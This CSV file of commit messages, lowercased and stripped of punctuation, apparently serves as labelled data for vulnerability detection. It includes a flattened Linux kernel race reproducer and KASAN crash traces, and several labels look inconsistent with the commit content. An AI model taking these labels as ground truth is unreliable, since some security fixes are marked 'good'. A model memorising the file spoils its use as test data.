"";"index";"all_text";"vuln"
"46";"3183";"block fix use after free in sys_ioprio_get get_task_ioprio access the task io_context without holding the task lock and thus can race with exit_io_context leading to a use after free the reproducer below hit this within a few second on my 4 core qemu vm define _gnu_source include assert h include unistd h include sys syscall h include sys wait h int main int argc char argv pid_t pid child long nproc i ioprio_set ioprio_who_process 0 ioprio_prio_value ioprio_class_idle 0 syscall sys_ioprio_set 1 0 0x6000 nproc sysconf _sc_nprocessors_onln for i 0 i nproc i pid fork assert pid 1 if pid 0 for pid fork assert pid 1 if pid 0 _exit 0 else child wait null assert child pid pid fork assert pid 1 if pid 0 for ioprio_get ioprio_who_pgrp 0 syscall sys_ioprio_get 2 0 for ioprio_get ioprio_who_pgrp 0 syscall sys_ioprio_get 2 0 return 0 this get u kasan dump like this 35 526914 35 530009 bug kasan out of bound in get_task_ioprio 0x7b 0x90 at addr ffff880066f34e6c 35 530009 read of size 2 by task ioprio gpf 363 35 530009 35 530009 bug blkdev_ioc not tainted kasan bad access detected 35 530009 35 530009 disabling lock debugging due to kernel taint 35 530009 info allocated in create_task_io_context 0x2b 0x370 age 0 cpu 0 pid 360 35 530009 ___slab_alloc 0x55d 0x5a0 35 530009 __slab_alloc isra 20 0x2b 0x40 35 530009 kmem_cache_alloc_node 0x84 0x200 35 530009 create_task_io_context 0x2b 0x370 35 530009 get_task_io_context 0x92 0xb0 35 530009 copy_process part 8 0x5029 0x5660 35 530009 _do_fork 0x155 0x7e0 35 530009 sys_clone 0x19 0x20 35 530009 do_syscall_64 0x195 0x3a0 35 530009 return_from_syscall_64 0x0 0x6a 35 530009 info freed in put_io_context 0xe7 0x120 age 0 cpu 0 pid 1060 35 530009 __slab_free 0x27b 0x3d0 35 530009 kmem_cache_free 0x1fb 0x220 35 530009 put_io_context 0xe7 0x120 35 530009 put_io_context_active 0x238 0x380 35 530009 exit_io_context 0x66 0x80 35 530009 do_exit 0x158e 0x2b90 35 530009 do_group_exit 0xe5 0x2b0 35 530009 sys_exit_group 0x1d 0x20 35 530009 entry_syscall_64_fastpath 0x1a 0xa4 35 530009 info slab 0xffffea00019bcd00 object 20 used 4 fp 0xffff880066f34ff0 flag 0x1fffe0000004080 35 530009 info object 0xffff880066f34e58 offset 3672 fp 0x0000000000000001 35 530009 fix it by grabbing the task lock while we poke at the io_context cc stable vger kernel org reported by dmitry vyukov dvyukov google com signed off by omar sandoval osandov fb com signed off by jens axboe axboe fb com";"bad"
"47";"2759";"atl2 disable unimplemented scatter gather feature atl2 includes netif_f_sg in hw_features even though it ha no support for non linear skbs this bug wa originally harmless since the driver doe not claim to implement checksum offload and that used to be a requirement for sg now that sg and checksum offload are independent feature if you explicitly enable sg and use one of the rare protocol that can use sg without checkusm offload this potentially leak sensitive information before you notice that it just isn t working therefore this obscure bug ha been designated cve 2016 2117 reported by justin yackoski jyackoski crypto nite com signed off by ben hutchings ben decadent org uk fix ec5f06156423 net kill link between csum and sg feature signed off by david s miller davem davemloft net";"bad"
"48";"8041";"fix misleading exception in mc_issue_note_update the error message wa referring to issue instead of issue note id";"good"
"49";"8470";"avformat movenc do not pas avcodecparameters in avpriv_request_sample fix out of array read fix ffmpeg_crash_8 avi found by thuan pham marcel böhme andrew santosa and alexandru razvan caciulescu with aflsmart signed off by michael niedermayer michael niedermayer cc";"good"
"50";"3222";"fixed a problem with a null pointer dereference in the bmp decoder";"bad"
"51";"11775";"detail test installed py ci skip";"good"
"52";"367";"usb dwc3 gadget never call complete from ep_queue this is a requirement which ha always existed but somehow wasn t reflected in the documentation and problem weren t found until now when tuba yavuz found a possible deadlock happening between dwc3 and f_hid she described the situation a follows spin_lock_irqsave hidg write_spinlock flag first acquire we our function ha been disabled by host if hidg req free_ep_req hidg in_ep hidg req goto try_again status usb_ep_queue hidg in_ep hidg req gfp_atomic usb_gadget_giveback_request f_hidg_req_complete spin_lock_irqsave hidg write_spinlock flag second acquire note that this happens because dwc3 would call complete on a failed usb_ep_queue due to failed start transfer command this is anyway a theoretical situation because dwc3 currently us no response update transfer command for bulk and interrupt endpoint it s still good to make this case impossible to happen even if the no reponse update transfer command is changed reported by tuba yavuz tuba ece ufl edu signed off by felipe balbi felipe balbi linux intel com cc stable stable vger kernel org signed off by greg kroah hartman gregkh linuxfoundation org";"bad"
"53";"9790";"fix h1 report 97123 cross site request forgery csrf the hackerone user decidedlygray ha reported a number of script in revive adserver s user interface that were vulnerable to csrf attack www admin banner acl php www admin banner activate php www admin banner advanced php www admin banner modify php www admin banner swf php www admin banner zone php www admin tracker modify php a cve id ha been requested but not assigned yet cwe cwe 352 cvssv2 5 av n ac l au n c n i n a p";"good"
"54";"4401";"http www imagemagick org discourse server viewtopic php f 3 t 31161";"bad"
"55";"11923";"ftrace fix checking of trampoline ftrace_ops in finding trampoline when modifying code ftrace ha several check to make sure thing are being done correctly one of them is to make sure any code it modifies is exactly what it expects it to be before it modifies it in order to do so with the new trampoline logic it must be able to find out what trampoline a function is hooked to in order to see if the code that hook to it is what s expected the logic to find the trampoline from a record accounting descriptor for a function that is hooked need to only look at the old_hash of an ops that is being modified the old_hash is the list of function an ops is hooked to before it update since a record would only be pointing to an ops that is being modified if it wa already hooked before currently it can pick a modified ops based on it new function it will be hooked to and this pick the wrong trampoline and cause the check to fail disabling ftrace signed off by steven rostedt rostedt goodmis org ftrace squash into ordering of ops for modification";"good"
"56";"10835";"move key generator to a more common place";"good"
"57";"9234";"use sanitize_path instead of normpath see a7b47f075499a1e1b40539bc1fa872a3ab77a204 the check for is now needle because the sane path is always absolute path replace o sep is only relevant for the multi filesystem backend and should be there";"good"
"58";"11490";"fixed test failure on mysql the fix for 20874 caused a mysql specific failure";"good"
"59";"9088";"move duplicate code in abstractxmppconnection from xmpp tcp bosh connection";"good"
"60";"6174";"add csrf protection for adm_config_delete";"bad"
"61";"11080";"src rf64 c remove debug write it to the log rather than stdout";"good"
"62";"10159";"escape in the upload field fix 791";"good"
"63";"8676";"merge pull request 4785 from alexwlchan encounterd of the third kind fix a typo in a test docstring";"good"
"64";"9002";"update readme md";"good"
"65";"2049";"decode file name before restricting extension";"bad"
"66";"3247";"regression fix last vulnerability fix for sanitizing order direction params";"bad"
"67";"1254";"ebmlunicodestring don t read beyond end of string the conversion from an utf 8 encoded string into a wchar_t one wa reading from beyond the end of the source buffer if the length indicated by a utf 8 character s first byte exceeds the number of byte actually present afterwards fix the issue reported a cisco talos can 0036";"bad"
"68";"4380";"backend only allow plain file in cpio_sender no device socket directory symlinks please";"bad"
"69";"1476";"fix up protocol case handling for security group fix bug 985184 when creating security group rule any case for the protocol wa accepted a input such a tcp tcp tcp etc and wa stored in the database a specified however unless specified a all lowercase the code to apply the rule would break and result in some rule not being applied change id i6c723d371579eb37a94bd484d39beeb773668ed4";"bad"
"70";"9990";"update dependency and upgrade jest 59";"good"
"71";"9577";"fix integer overflow in stringutil implode reviewed by ricklavoie differential revision d3623922 fbshipit source id 136d124a850c07cc6c63535afc11d36499d576fc";"good"
"72";"12227";"yii 1 1 18 fix";"good"
"73";"1889";"allow object clone to copy frozen status only fix 4036 copying all flag from the original object may overwrite the clone s flag e g the embedded flag";"bad"
"74";"2789";"alsa timer harden slave timer list handling a slave timer instance might be still accessible in a racy way while operating the master instance a it lack of locking since the master operation is mostly protected with timer lock we should cope with it while changing the slave instance too also some linked list active_list and ack_list of slave instance aren t unlinked immediately at stopping or closing and this may lead to unexpected access this patch try to address these issue it add spin lock of timer lock either from master or slave which is equivalent in a few place for avoiding a deadlock we ensure that the global slave_active_lock is always locked at first before each timer lock also ack and active_list of slave instance are properly unlinked at snd_timer_stop and snd_timer_close last but not least remove the superfluous call of _snd_timer_stop at removing slave link this is a noop and calling it may confuse reader wrt locking further cleanup will follow in a later patch actually we ve got report of use after free by syzkaller fuzzer and this hopefully fix these issue reported by dmitry vyukov dvyukov google com cc stable vger kernel org signed off by takashi iwai tiwai suse de";"bad"
"75";"7979";"bump changelog";"good"
"76";"910";"5566 created a more general function to check referer and updated create user and create admin to use it";"bad"
"77";"11518";"ffmpeg_filter pas command line thread x to filtergraph signed off by michael niedermayer michaelni gmx at";"good"
"78";"1403";"null pointer deref in kadmind cve 2012 1013 the fix for 6626 could cause kadmind to dereference a null pointer if a create principal request contains no password but doe contain the krb5_kdb_disallow_all_tix flag e g addprinc randkey allow_tix name only client authorized to create principal can trigger the bug fix the bug by testing for a null password in check_1_6_dummy cvssv2 vector av n ac m au s c n i n a p e h rl o rc c ghudson mit edu minor style change and commit message ticket 7152 target_version 1 10 2 tag pullup";"bad"
"79";"9788";"fix h1 report 98612 information exposure through discrepancy karan m tank and smit b shah have reported via hackerone that it wa possible to check whether or not an email address wa associated to one or more user account on a target revive adserver instance by examining the message printed by the password recovery system such information cannot however be used directly to log in to the system which requires usernames instead a cve id ha been requested but not assigned yet cwe cwe 203 cvssv2 5 av n ac l au n c p i n a n";"good"
"80";"7039";"fixed issue security 15204 stored x vulnerability thanks to j greil from the sec consult vulnerability lab http www sec consult com dev encode group name in alert deleted";"good"
"81";"3389";"sentrifugo 3 2";"bad"
"82";"10179";"enhancement added ssviewer getoption a a logical counterpart to ssviewer setoption";"good"
"83";"4197";"hid usbhid fix out of bound bug the hid descriptor identifies the length and type of subordinate descriptor for a device if the received hid descriptor is smaller than the size of the struct hid_descriptor it is possible to cause out of bound in addition if bnumdescriptors of the hid descriptor have an incorrect value this can also cause out of bound while approaching hdesc desc n so check the size of hid descriptor and bnumdescriptors bug kasan slab out of bound in usbhid_parse 0x9b1 0xa20 read of size 1 at addr ffff88006c5f8edf by task kworker 1 2 1261 cpu 1 pid 1261 comm kworker 1 2 not tainted 4 14 0 rc1 42251 gebb2c2437d80 169 hardware name qemu standard pc i440fx piix 1996 bios bochs 01 01 2011 workqueue usb_hub_wq hub_event call trace __dump_stack lib dump_stack c 16 dump_stack 0x292 0x395 lib dump_stack c 52 print_address_description 0x78 0x280 mm kasan report c 252 kasan_report_error mm kasan report c 351 kasan_report 0x22f 0x340 mm kasan report c 409 __asan_report_load1_noabort 0x19 0x20 mm kasan report c 427 usbhid_parse 0x9b1 0xa20 driver hid usbhid hid core c 1004 hid_add_device 0x16b 0xb30 driver hid hid core c 2944 usbhid_probe 0xc28 0x1100 driver hid usbhid hid core c 1369 usb_probe_interface 0x35d 0x8e0 driver usb core driver c 361 really_probe driver base dd c 413 driver_probe_device 0x610 0xa00 driver base dd c 557 __device_attach_driver 0x230 0x290 driver base dd c 653 bus_for_each_drv 0x161 0x210 driver base bus c 463 __device_attach 0x26e 0x3d0 driver base dd c 710 device_initial_probe 0x1f 0x30 driver base dd c 757 bus_probe_device 0x1eb 0x290 driver base bus c 523 device_add 0xd0b 0x1660 driver base core c 1835 usb_set_configuration 0x104e 0x1870 driver usb core message c 1932 generic_probe 0x73 0xe0 driver usb core generic c 174 usb_probe_device 0xaf 0xe0 driver usb core driver c 266 really_probe driver base dd c 413 driver_probe_device 0x610 0xa00 driver base dd c 557 __device_attach_driver 0x230 0x290 driver base dd c 653 bus_for_each_drv 0x161 0x210 driver base bus c 463 __device_attach 0x26e 0x3d0 driver base dd c 710 device_initial_probe 0x1f 0x30 driver base dd c 757 bus_probe_device 0x1eb 0x290 driver base bus c 523 device_add 0xd0b 0x1660 driver base core c 1835 usb_new_device 0x7b8 0x1020 driver usb core hub c 2457 hub_port_connect driver usb core hub c 4903 hub_port_connect_change driver usb core hub c 5009 port_event driver usb core hub c 5115 hub_event 0x194d 0x3740 driver usb core hub c 5195 process_one_work 0xc7f 0x1db0 kernel workqueue c 2119 worker_thread 0x221 0x1850 kernel workqueue c 2253 kthread 0x3a1 0x470 kernel kthread c 231 ret_from_fork 0x2a 0x40 arch x86 entry entry_64 s 431 cc stable vger kernel org reported by andrey konovalov andreyknvl google com signed off by jaejoong kim climbbb kim gmail com tested by andrey konovalov andreyknvl google com acked by alan stern stern rowland harvard edu signed off by jiri kosina jkosina suse cz";"bad"
"84";"4419";"drm vc4 fix an integer overflow in temporary allocation layout we copy the unvalidated ioctl argument from the user into kernel temporary memory to run the validation from to avoid a race where the user update the unvalidate content in between validating them and copying them into the validated bo however in setting up the layout of the kernel side we failed to check one of the addition the roundup for shader_rec_offset against integer overflow allowing a nearly max_uint value of bin_cl_size to cause u to under allocate the temporary space that we then copy_from_user into reported by murray mcallister murray mcallister insomniasec com signed off by eric anholt eric anholt net fix d5b1a78a772f drm vc4 add support for drawing 3d frame";"bad"
"85";"9570";"perf add a bit of paranoia add a few warn s to catch thing that should never happen signed off by peter zijlstra intel peterz infradead org cc arnaldo carvalho de melo acme kernel org cc linus torvalds torvalds linux foundation org link http lkml kernel org r 20150123125834 150481799 infradead org signed off by ingo molnar mingo kernel org";"good"
"86";"4051";"fix for 184";"bad"
"87";"1683";"escape content bug 11189";"bad"
"88";"2229";"fix cve 2018 19993";"bad"
"89";"11465";"merge branch for_linus of git cavan codon org uk platform driver x86 pull x86 platform driver update from matthew garrett a moderate diffstat but it s almost entirely just moving the chromebook driver into it own directory in order to ease arm support adding back rfkill support to the one dell laptop model where it s expected to work update to the intel ipc driver for hardware i ve never actually seen and the usual set of small fix this actually came in before the merge window closed and i had just missed it because it didn t match my git pull email pattern linus for_linus of git cavan codon org uk platform driver x86 24 commits x86 wmi fix modalias_show return value ipc added support for ipc interrupt mode ipc handle error condition in ipc command ipc enabled ipc support for additional intel platform ipc added platform data structure thinkpad_acpi fix build error when config_snd_max_cards 32 platform add chrome platform directory hp wmi detect 2009 bios or later flag by wmi 0x0d for wireless cmd dell wmi add key_micmute to bios_to_linux_keycode platform x86 remove oom message after input_allocate_device sony laptop fixe typo in sony_laptop_input_keycode_map sony laptop warn on multiple kbd backlight handle dell laptop only enable rfkill functionality on laptop with a hw killswitch dell laptop add a force_rfkill module parameter dell laptop wait le long before updating rfkill after an rfkill keypress dell laptop do not skip setting blocked bit rfkill_set while hw blocked dell laptop sync current block state to bios on hw switch change dell laptop allow changing the sw_state while the radio is blocked by hw dell laptop don t read back sw_state on machine with a hardware switch dell laptop don t set sw_state from the query callback";"good"
"90";"7674";"fix mb_substitute_character use";"good"
"91";"5069";"remove remember me until i can think of a better solution close 2";"bad"
"92";"6281";"fix x issue";"bad"
"93";"6870";"save and restores cron context during call of savedsearch_alert cronsavedsearchesalerts 6039 save and restore cron session context in savedsearch_alert cronsavedsearchesalerts to be sure that 1 that log will be in glpi with default datetime and language 1 and that notification are sent even if _session glpinotification_to_myself is false 1 and to restore default cron _session and cfg_glpi global variable for next cron task";"good"
"94";"10691";"input joydev blacklist ds3 ds4 udraw motion sensor introduce a device table used for blacklisting device we currently blacklist the motion sensor subdevice of thq udraw and sony ds3 ds4 signed off by roderick colenbrander roderick colenbrander sony com dtor siwtched to blacklist built on input_device_id and using input_match_device_id signed off by dmitry torokhov dmitry torokhov gmail com";"good"
"95";"7997";"m_remove forbid removing ulined user";"good"
"96";"10677";"revert xhci limit usb2 port wake support for amd promontory host this reverts commit dec08194ffeccfa1cf085906b53d301930eae18f commit dec08194ffec xhci limit usb2 port wake support for amd promontory host make all high speed usb port on asus prime b350m a cease to function after enabling runtime pm all board with this chipsets will be affected so revert the commit the original patch wa added to stable 4 9 4 11 and 4 12 and need to reverted from there a well cc stable vger kernel org 4 9 signed off by kai heng feng kai heng feng canonical com signed off by mathias nyman mathias nyman linux intel com signed off by greg kroah hartman gregkh linuxfoundation org";"good"
"97";"2838";"fix 14635 bump safemode version to fix the unwanted inspect issue";"bad"
"98";"7608";"hashindex fix issue with file size larger than 2gb see http librelist com browser attic 2015 1 6 doe attic have an upper data size limit";"good"
"99";"1467";"mm pmd_read_atomic fix 32bit pae pmd walk v pmd_populate smp race condition when holding the mmap_sem for reading pmd_offset_map_lock should only run on a pmd_t that ha been read atomically from the pmdp pointer otherwise we may read only half of it leading to this crash pid 11679 task f06e8000 cpu 3 command do_race_2_panic 0 f06a9dd8 crash_kexec at c049b5ec 1 f06a9e2c oops_end at c083d1c2 2 f06a9e40 no_context at c0433ded 3 f06a9e64 bad_area_nosemaphore at c043401a 4 f06a9e6c __do_page_fault at c0434493 5 f06a9eec do_page_fault at c083eb45 6 f06a9f04 error_code via page_fault at c083c5d5 eax 01fb470c ebx fff35000 ecx 00000003 edx 00000100 ebp 00000000 d 007b esi 9e201000 e 007b edi 01fb4700 g 00e0 c 0060 eip c083bc14 err ffffffff eflags 00010246 7 f06a9f38 _spin_lock at c083bc14 8 f06a9f44 sys_mincore at c0507b7d 9 f06a9fb0 system_call at c083becd start len eax ffffffda ebx 9e200000 ecx 00001000 edx 6228537f d 007b esi 00000000 e 007b edi 003d0f00 s 007b esp 62285354 ebp 62285388 g 0033 c 0073 eip 00291416 err 000000da eflags 00000286 this should be a longstanding bug affecting x86 32bit pae without thp only arch with 64bit large pmd_t and 32bit unsigned long should be affected with thp enabled the barrier in pmd_none_or_trans_huge_or_clear_bad would partly hide the bug when the pmd transition from none to stable by forcing a re read of the pmd in pmd_offset_map_lock but when thp is enabled a new set of problem arises by the fact could then transition freely in any of the none pmd_trans_huge or pmd_trans_stable state so making the barrier in pmd_none_or_trans_huge_or_clear_bad unconditional isn t good idea and it would be a flakey solution this should be fully fixed by introducing a pmd_read_atomic that read the pmd in order with thp disabled or by reading the pmd atomically with cmpxchg8b with thp enabled luckily this new race condition only trigger in the place that must already be covered by pmd_none_or_trans_huge_or_clear_bad so the fix is localized there but this bug is not related to thp note this can trigger on x86 32bit system with pae enabled with more than 4g of ram otherwise the high part of the pmd will never risk to be truncated because it would be zero at all time in turn so hiding the smp race this bug wa discovered and fully debugged by ulrich quote pmd_none_or_trans_huge_or_clear_bad load the content of edx and eax 496 static inline int pmd_none_or_trans_huge_or_clear_bad pmd_t pmd 497 498 depend on compiler for an atomic pmd read 499 pmd_t pmdval pmd edi pmd pointer 0xc0507a74 sys_mincore 548 mov 0x8 esp edi edx pte page table high address 0xc0507a84 sys_mincore 564 mov 0x4 edi edx eax pte page table low address 0xc0507a8e sys_mincore 574 mov edi eax please note that the pmd is not read atomically these are two mov instruction where the high order bit of the pmd entry are fetched first hence the above machine code is prone to the following race the pmd entry high low is 0x0000000000000000 the mov at 0xc0507a84 load 0x00000000 into edx a page fault on another cpu sneak in between the two mov instruction and instantiates the pmd the pmd entry high low is now 0x00000003fda38067 the mov at 0xc0507a8e load 0xfda38067 into eax reported by ulrich obergfell uobergfe redhat com signed off by andrea arcangeli aarcange redhat com cc mel gorman mgorman suse de cc hugh dickins hughd google com cc larry woodman lwoodman redhat com cc petr matousek pmatouse redhat com cc rik van riel riel redhat com cc stable vger kernel org signed off by andrew morton akpm linux foundation org signed off by linus torvalds torvalds linux foundation org";"bad"
"100";"6591";"fixing potential x this issue ha been discovered by hyp3rlinx script and html injection wa possible when the user wa authenticated picked from 0f27412127";"bad"
"101";"10545";"timesheet fix bug where editing entry from disabled user changed the user";"good"
"102";"2836";"input ims pcu sanity check against missing interface a malicious device missing interface can make the driver oops add sanity checking signed off by oliver neukum oneukum suse com cc stable vger kernel org signed off by dmitry torokhov dmitry torokhov gmail com";"bad"
"103";"6984";"doc tidy up select all";"good"
"104";"13034";"fix cve 2015 7365 reflected x abdullah hussam gazi ha discovered that the plugin upgrade form wasn t properly escaping the filename before displaying it when uploading a file with error exploiting the vulnerbility requires a specifically crafted multipart post message cwe cwe 79 cvssv2 4 3 av n ac m au n c n i p a n";"good"
"105";"9103";"getmagickhomeurl not longer leak memory";"good"
"106";"9905";"debug mode can now only be enabled by an environment variable";"good"
"107";"9455";"reduce user username column size to 191 char the varchar 255 implemented to address issue 8017 wa causing issue with utf8mb4 encoding due a limitation in the size of index in mysql fix 20465";"good"
"108";"1277";"gdimagescaletwopass memory leak fix fixing memory leak in gdimagescaletwopass a reported by cmb69 and confirmed by vapier this bug actually bit me in production and i m very thankful that it wa reported with an easy fix fix 173";"bad"
"109";"2575";"remove support for pre authentication compression doing compression early in the protocol probably seemed reasonable in the 1990s but today it s clearly a bad idea in term of both cryptography cf multiple compression oracle attack in tl and attack surface moreover to support it across privilege separation zlib needed the assistance of a complex shared memory manager that made the required attack surface considerably larger prompted by guido vranken pointing out a compiler elided security check in the shared memory manager found by stack http cs csail mit edu stack ok deraadt markus nb pre auth authentication ha been disabled by default in sshd for 10 year";"bad"
"110";"3629";"backported unescaped shell command fix from master branch";"bad"
